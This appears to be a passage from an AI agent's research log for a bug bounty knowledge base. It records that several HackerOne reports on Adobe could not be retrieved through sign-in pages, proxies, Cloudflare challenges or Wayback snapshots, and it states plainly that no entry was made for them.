summary. INVALID / UNREACHABLE (no entry): HackerOne #2615168 (Adobe, "Disclosure of git metadata and springboot actuator information", reporter jf0x0r, Low CVSS 3.7, disclosed 2025-04-07) — the report page would NOT render on any route: `web_extract` -> the HackerOne sign-in page; the browser tool -> the Cloudflare "Just a moment..." challenge (never cleared over ~40 s, redirected to /users/sign_in); `https://r.jina.ai/<url>` -> HTTP 403 "Upstream forbidden"; every Wayback snapshot (20250407085603 / 20250407174343 / 20250430083137 / 20250615140957) is the 2,868-byte "JavaScript is disabled" SPA shell; the credited public writeup (the reporter's own site juanfelipeoz.com) carries only a Hacktivity CARD IMAGE (OCR'd this pass: the card text is the one-paragraph program summary and no steps) — so no request shape, no endpoint and no method exist publicly; the title alone (a Low 3.7 git-metadata/actuator info disclosure) is below the entry bar. HackerOne #1318936 (Adobe, "Registration Information Leakage", reporter titanrain, Medium 5.3, disclosed 2025-01-29) — LIMITED DISCLOSURE: the only public text is Adobe's one-sentence program summary ("The security researcher discovered an Improper Access Control that lead to information exposure.") plus the timeline; no steps, no endpoint, no parameter and no bypass exist publicly, so the report teaches nothing concrete. 6 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://hackerone.com/reports/2188569  2026-11-10
ROUTE: the live HackerOne report page would NOT render on any primary route — `web_extract` -> the HackerOne sign-in page; `https://r.jina.ai/<url>` -> HTTP 403 "Upstream forbidden"; the browser tool -> Cloudflare "Just a moment..." (never cleared over ~25 s, redirected to /users/sign_in); every Wayback snapshot (20240131104941 / 20240519165240 / 20250125020201) is the ~3.7 KB "JavaScript is disabled" SPA shell, and the 2025-01-25 fetch was additionally refused by archive.org's bot filter.
